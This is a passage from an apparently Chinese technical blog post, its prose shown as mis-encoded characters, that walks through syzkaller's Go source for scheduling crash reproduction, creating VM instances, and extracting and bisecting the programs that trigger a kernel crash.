instances.Snapshot(),<br><span class="hljs-built_in">len</span>(pendingRepro), <span class="hljs-built_in">len</span>(reproducing), <span class="hljs-built_in">len</span>(reproQueue))<br><br>canRepro := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> phase &gt;= phaseTriagedHub &amp;&amp; <span class="hljs-built_in">len</span>(reproQueue) != <span class="hljs-number">0</span> &amp;&amp;<br>(<span class="hljs-type">int</span>(atomic.LoadUint32(&amp;mgr.numReproducing))+<span class="hljs-number">1</span>)*instancesPerRepro &lt;= maxReproVMs<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ä¸¤ä¸ªå°å¾ªç¯ï¼š</p><h4 id="â‘ -å¾ªç¯å¯åŠ¨åç¨‹è°ƒåº¦-VM-è¿›è¡Œ-crash-å¤ç°">â‘  å¾ªç¯å¯åŠ¨åç¨‹è°ƒåº¦ VM è¿›è¡Œ crash å¤ç°</h4><p>ç¬¬ä¸€ä¸ªå°å¾ªç¯ä¼šå¾ªç¯åˆ¤æ–­æ˜¯å¦å¯ä»¥è¿›è¡Œ crash å¤ç°ï¼š</p><ul><li>è‹¥å¯ä»¥å¤ç°åˆ™ä»èµ„æºæ± é˜Ÿåˆ—ä¸­å–å‡ºä¸€ä¸ª VM idxï¼Œè‹¥èµ„æºæ± ä¸ºç©ºåˆ™ç›´æ¥è·³å‡º</li><li>ä» <code>reproQueue</code> ä¸­å–å‡ºä¸€ä¸ª crashï¼Œæ›´æ–° manager çš„ <code>numReproducing</code> è®¡æ•°</li><li>å¯åŠ¨ä¸€ä¸ªæ–°çš„åç¨‹è°ƒç”¨ <code>runRepro()</code> å¯¹è¯¥ crash è¿›è¡Œå¤ç°ï¼Œç»“æœè¾“å‡ºè‡³ <code>reproDone</code> é˜Ÿåˆ—ä¸­</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> shutdown != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> canRepro() &#123;<br>vmIndexes := instances.Take(instancesPerRepro)<br><span class="hljs-keyword">if</span> vmIndexes == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>last := <span class="hljs-built_in">len</span>(reproQueue) - <span class="hljs-number">1</span><br>crash := reproQueue[last]<br>reproQueue[last] = <span class="hljs-literal">nil</span><br>reproQueue = reproQueue[:last]<br>atomic.AddUint32(&amp;mgr.numReproducing, <span class="hljs-number">1</span>)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: starting repro of &#x27;%v&#x27; on instances %+v&quot;</span>, crash.Title, vmIndexes)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>reproDone &lt;- mgr.runRepro(crash, vmIndexes, instances.Put)<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œ <code>runRepro()</code> å…¶å®å°±æ˜¯ <code>repro.Run()</code> çš„ wrapper ï¼‹ ä¸€äº›é”™è¯¯æ£€æŸ¥åå°† VM idx æ”¾å›èµ„æºæ± ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runRepro(crash *Crash, vmIndexes []<span class="hljs-type">int</span>, putInstances <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(...<span class="hljs-type">int</span>)</span></span>) *ReproResult &#123;<br>features := mgr.checkResult.Features<br>res, stats, err := repro.Run(crash.Output, mgr.cfg, features, mgr.reporter, mgr.vmPool, vmIndexes)<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p><code>Run()</code> ä¸€å¼€å§‹ä¸»è¦æ˜¯ä¸€äº›æ£€æŸ¥ï¼Œä¹‹åæ ¹æ® crash ç±»å‹çš„ä¸åŒè®¾ç½®ä¸åŒçš„å¤ç°æ—¶é—´ä¸Šé™ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Run</span><span class="hljs-params">(crashLog []<span class="hljs-type">byte</span>, cfg *mgrconfig.Config, features *host.Features, reporter *report.Reporter,</span></span><br><span class="hljs-params"><span class="hljs-function">vmPool *vm.Pool, vmIndexes []<span class="hljs-type">int</span>)</span></span> (*Result, *Stats, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vmIndexes) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;no VMs provided&quot;</span>)<br>&#125;<br>entries := cfg.Target.ParseLog(crashLog)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(entries) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;crash log does not contain any programs&quot;</span>)<br>&#125;<br>crashStart := <span class="hljs-built_in">len</span>(crashLog)<br>crashTitle, crashType := <span class="hljs-string">&quot;&quot;</span>, report.Unknown<br><span class="hljs-keyword">if</span> rep := reporter.Parse(crashLog); rep != <span class="hljs-literal">nil</span> &#123;<br>crashStart = rep.StartPos<br>crashTitle = rep.Title<br>crashType = rep.Type<br>&#125;<br>testTimeouts := []time.Duration&#123;<br><span class="hljs-number">3</span> * cfg.Timeouts.Program, <span class="hljs-comment">// ä»¥æ•è·æ›´ç®€å•çš„ crashes (å³ no races and no hangs)</span><br><span class="hljs-number">20</span> * cfg.Timeouts.Program,<br>cfg.Timeouts.NoOutputRunningTime, <span class="hljs-comment">// ä»¥æ•è· &quot;no output&quot;, races and hangs</span><br>&#125;<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> crashTitle == <span class="hljs-string">&quot;&quot;</span>:<br>crashTitle = <span class="hljs-string">&quot;no output/lost connection&quot;</span><br><span class="hljs-comment">// Lost connection å¯ä»¥è¢«æ›´å¿«åœ°æ£€æµ‹åˆ°,</span><br><span class="hljs-comment">// ä½†ç†è®ºä¸Šè‹¥å…¶ç”±ç«äº‰é€ æˆï¼Œåˆ™å¯èƒ½éœ€è¦æœ€é•¿çš„ timeout.</span><br><span class="hljs-comment">// No output ä»…èƒ½åœ¨æœ€å¤§çš„ timeout ä¸‹è¢«å¤ç°.</span><br><span class="hljs-comment">// ä½œä¸ºå¦¥åï¼Œæˆ‘ä»¬ä½¿ç”¨æœ€å°ä¸æœ€å¤§çš„ timeouts.</span><br>testTimeouts = []time.Duration&#123;testTimeouts[<span class="hljs-number">0</span>], testTimeouts[<span class="hljs-number">2</span>]&#125;<br><span class="hljs-keyword">case</span> crashType == report.MemoryLeak:<br><span class="hljs-comment">// ç”±äºæ˜‚è´µçš„è®¾ç½®ä¸æ‰«æï¼Œå†…å­˜æ³„éœ²ä¸èƒ½è¢«å¾ˆå¿«åœ°æ£€æµ‹åˆ°.</span><br>testTimeouts = testTimeouts[<span class="hljs-number">1</span>:]<br><span class="hljs-keyword">case</span> crashType == report.Hang:<br>testTimeouts = testTimeouts[<span class="hljs-number">2</span>:]<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¼šå°†å´©æºƒä¿¡æ¯å­˜å‚¨åˆ°ä¸€ä¸ª <code>context</code> ç»“æ„ä½“ä¸­ï¼Œå¹¶æ–°å»ºä¸€ä¸ª WaitGroupï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go">ctx := &amp;context&#123;<br>target:       cfg.SysTarget,<br>reporter:     reporter,<br>crashTitle:   crashTitle,<br>crashType:    crashType,<br>instances:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *reproInstance, <span class="hljs-built_in">len</span>(vmIndexes)),<br>bootRequests: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-built_in">len</span>(vmIndexes)),<br>testTimeouts: testTimeouts,<br>startOpts:    createStartOptions(cfg, features, crashType),<br>stats:        <span class="hljs-built_in">new</span>(Stats),<br>timeouts:     cfg.Timeouts,<br>&#125;<br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v programs, %v VMs, timeouts %v&quot;</span>, <span class="hljs-built_in">len</span>(entries), <span class="hljs-built_in">len</span>(vmIndexes), testTimeouts)<br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br>wg.Add(<span class="hljs-built_in">len</span>(vmIndexes))<br></code></pre></td></tr></table></figure><p>éšåå¾ªç¯è·å–ç”¨ä»¥å¤ç°çš„ VM idx å¹¶ä¾æ¬¡å¯åŠ¨æ–°åç¨‹è°ƒç”¨ <code>CreateExecProgInstance()</code> <strong>åˆ›å»º VM å¹¶æ‹·è´ crash ç¨‹åº</strong>ï¼Œè‹¥å¤±è´¥åˆ™ä¼‘çœ  10s åé‡è¯•ï¼Œæœ€å¤šä¼šå°è¯• <code>maxTry</code> æ¬¡ï¼›æˆåŠŸçš„ç»“æœä¼šè¾“å‡ºåˆ° <code>ctx.instances</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, vmIndex := <span class="hljs-keyword">range</span> vmIndexes &#123;<br>ctx.bootRequests &lt;- vmIndex<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br><span class="hljs-keyword">for</span> vmIndex := <span class="hljs-keyword">range</span> ctx.bootRequests &#123;<br><span class="hljs-keyword">var</span> inst *instance.ExecProgInstance<br>maxTry := <span class="hljs-number">3</span><br><span class="hljs-keyword">for</span> try := <span class="hljs-number">0</span>; try &lt; maxTry; try++ &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-vm.Shutdown:<br>try = maxTry<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">default</span>:<br>&#125;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>inst, err = instance.CreateExecProgInstance(vmPool, vmIndex, cfg,<br>reporter, &amp;instance.OptionalConfig&#123;Logf: ctx.reproLogf&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;failed to init instance: %v&quot;</span>, err)<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> inst == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>ctx.instances &lt;- &amp;reproInstance&#123;execProg: inst, index: vmIndex&#125;<br>&#125;<br>&#125;()<br>&#125;<br><span class="hljs-comment">// ä¸€äº›æ”¶å°¾å·¥ä½œ...</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>wg.Wait()<br><span class="hljs-built_in">close</span>(ctx.instances)<br>&#125;()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-built_in">close</span>(ctx.bootRequests)<br><span class="hljs-keyword">for</span> inst := <span class="hljs-keyword">range</span> ctx.instances &#123;<br>inst.execProg.VMInstance.Close()<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><p><code>CreateExecProgInstance()</code> ä¸»è¦å°±æ˜¯è°ƒç”¨ <code>vmPool.Create()</code> å¯åŠ¨è™šæ‹Ÿæœºåè°ƒç”¨ <code>SetupExecProg()</code> æ‹·è´è¦æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™é‡Œå°±ä¸å±•å¼€äº†ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreateExecProgInstance</span><span class="hljs-params">(vmPool *vm.Pool, vmIndex <span class="hljs-type">int</span>, mgrCfg *mgrconfig.Config,</span></span><br><span class="hljs-params"><span class="hljs-function">reporter *report.Reporter, opt *OptionalConfig)</span></span> (*ExecProgInstance, <span class="hljs-type">error</span>) &#123;<br>vmInst, err := vmPool.Create(vmIndex)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create VM: %v&quot;</span>, err)<br>&#125;<br>ret, err := SetupExecProg(vmInst, mgrCfg, reporter, opt)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>vmInst.Close()<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> ret, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å›åˆ° <code>Run()</code>  ä¸­ï¼Œå…¶æœ€åä¼šè°ƒç”¨ <code>context.repro()</code> <strong>æ­£å¼å¼€å§‹å¤ç° crash çš„å·¥ä½œ</strong>ï¼Œæ£€æŸ¥ç»“æœåè¿”å›ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go">res, err := ctx.repro(entries, crashStart)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;repro crashed as (corrupted=%v):\n%s&quot;</span>,<br>ctx.report.Corrupted, ctx.report.Report)<br><span class="hljs-comment">// Try to rerun the repro if the report is corrupted.</span><br><span class="hljs-keyword">for</span> attempts := <span class="hljs-number">0</span>; ctx.report.Corrupted &amp;&amp; attempts &lt; <span class="hljs-number">3</span>; attempts++ &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;report is corrupted, running repro again&quot;</span>)<br><span class="hljs-keyword">if</span> res.CRepro &#123;<br>_, err = ctx.testCProg(res.Prog, res.Duration, res.Opts)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>_, err = ctx.testProg(res.Prog, res.Duration, res.Opts)<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;final repro crashed as (corrupted=%v):\n%s&quot;</span>,<br>ctx.report.Corrupted, ctx.report.Report)<br>res.Report = ctx.report<br>&#125;<br><span class="hljs-keyword">return</span> res, ctx.stats, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>repro()</code> å‡½æ•°ä¸»è¦åˆ†ä¸¤éƒ¨åˆ†ï¼š</p><ul><li><p>è°ƒç”¨ <code>extractProg()</code> <strong>è·å–è§¦å‘ crash çš„ç¨‹åºé›†åˆ</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *context)</span></span> repro(entries []*prog.LogEntry, crashStart <span class="hljs-type">int</span>) (*Result, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// å»é™¤åœ¨ crash å‘ç”Ÿåæ‰§è¡Œçš„ç¨‹åº.</span><br><span class="hljs-keyword">for</span> i, ent := <span class="hljs-keyword">range</span> entries &#123;<br><span class="hljs-keyword">if</span> ent.Start &gt; crashStart &#123;<br>entries = entries[:i]<br><span class="hljs-keyword">break</span><br>&#125;<br>&#125;<br><br>reproStart := time.Now()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;reproducing took %s&quot;</span>, time.Since(reproStart))<br>&#125;()<br><br>res, err := ctx.extractProg(entries)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>res.Opts.Repro = <span class="hljs-literal">false</span><br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure></li><li><p>æœ€å°åŒ–ç¨‹åºé›†åˆå¹¶å°è¯•ç”Ÿæˆå¯ä»¥è§¦å‘è¯¥ crash çš„ C ç¨‹åºï¼Œè¿”å›ç»“æœï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// å°è¯•æœ€å°åŒ–ç¨‹åºé›†</span><br>res, err = ctx.minimizeProg(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// é¦–å…ˆå°è¯•åœ¨ä¸ç®€åŒ–é…ç½®çš„æƒ…å†µä¸‹æå– C repro.</span><br>res, err = ctx.extractC(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-comment">// ç®€åŒ–é…ç½®å¹¶å°è¯•æå– C repro.</span><br><span class="hljs-keyword">if</span> !res.CRepro &#123;<br>res, err = ctx.simplifyProg(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// ç®€åŒ– C ç›¸å…³çš„é…ç½®.</span><br><span class="hljs-keyword">if</span> res.CRepro &#123;<br>res, err = ctx.simplifyC(res)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><code>extractProg()</code> çš„é€»è¾‘æ¯”è¾ƒç®€å•ï¼š</p><ul><li>é€†åºåè°ƒç”¨ <code>context.extractProgSingle()</code> <strong>é€ä¸ªè¿è¡Œå•ä¸ªç¨‹åº</strong>ï¼Œè‹¥æŸä¸€ç¨‹åºè§¦å‘äº† crash åˆ™ç›´æ¥è¿”å›</li><li>è‹¥å•ä¸€ç¨‹åºæ— æ³•è§¦å‘ crashï¼Œåˆ™è°ƒç”¨ <code>context.extractProgBisect()</code> <strong>ä½¿ç”¨äºŒåˆ†æ³•æ‰¾å‡ºè§¦å‘ crash çš„ç¨‹åºé›†åˆ</strong></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(ctx *context)</span></span> extractProg(entries []*prog.LogEntry) (*Result, <span class="hljs-type">error</span>) &#123;<br>ctx.reproLogf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;extracting reproducer from %v programs&quot;</span>, <span class="hljs-built_in">len</span>(entries))<br>start := time.Now()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>ctx.stats.ExtractProgTime = time.Since(start)<br>&#125;()<br><br><span class="hljs-comment">// Extract last program on every proc.</span><br>procs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br><span class="hljs-keyword">for</span> i, ent := <span class="hljs-keyword">range</span> entries &#123;<br>procs[ent.Proc] = i<br>&#125;<br><span class="hljs-keyword">var</span> indices []<span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> _, idx := <span class="hljs-keyword">range</span> procs &#123;<br>indices = <span class="hljs-built_in">append</span>(indices, idx)<br>&#125;<br>sort.Ints(indices)<br><span class="hljs-keyword">var</span> lastEntries []*prog.LogEntry<br><span class="hljs-keyword">for</span> i := <span class="hljs-built_in">len</span>(indices) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i-- &#123;<br>lastEntries = <span class="hljs-built_in">append</span>(lastEntries, entries[indices[i]])<br>&#125;<br><span class="hljs-keyword">for</span> _, timeout := <span class="hljs-keyword">range</span> ctx.testTimeouts &#123;<br><span class="hljs-comment">// åˆ†åˆ«æ‰§è¡Œæ¯ä¸ªç¨‹åºä»¥æ£€æµ‹ç”±å•ä¸ªç¨‹åºé€ æˆçš„ç®€å•çš„ crash.</span><br><span class="hljs-comment">// ç¨‹åºè¢«é€†åºæ‰§è¡Œ, é€šå¸¸æœ€åä¸€ä¸ªç¨‹åºå°±æ˜¯ç½ªé­ç¥¸é¦–.</span><br>res, err := ctx.extractProgSingle(lastEntries, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="hljs-built_in">len</span>(res.Prog.Calls))<br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// è‹¥åªæœ‰ä¸€ä¸ª entry åˆ™ä¸è¿›è¡ŒäºŒåˆ†.</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(entries) == <span class="hljs-number">1</span> &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><br><span class="hljs-comment">// æ‰§è¡Œå¤šä¸ªç¨‹åºå¹¶äºŒåˆ† log ä»¥æ‰¾åˆ°é€ æˆå´©æºƒçš„å¤šä¸ªç¨‹åº.</span><br>res, err = ctx.extractProgBisect(entries, timeout)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> res != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">3</span>, <span class="hljs-string">&quot;found reproducer with %d syscalls&quot;</span>, <span class="hljs-built_in">len</span>(res.Prog.Calls))<br><span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br><br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;failed to extract reproducer&quot;</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span 